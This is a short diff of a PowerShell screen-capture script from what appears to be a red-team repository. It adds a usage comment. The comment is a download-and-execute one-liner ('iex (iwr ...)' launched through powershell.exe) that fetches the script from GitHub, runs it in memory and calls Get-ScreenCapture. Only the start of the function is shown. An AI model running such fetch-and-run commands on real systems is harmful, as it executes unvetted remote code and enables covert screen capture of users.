@@ -1,6 +1,10 @@
 # Example usage:
 # iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_3.ps1);Get-ScreenCapture
+# OR
+# powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_3.ps1);Get-ScreenCapture"
 # Deafult path: $pwd)
+
+
 function Get-ScreenCapture
 {
     param(    
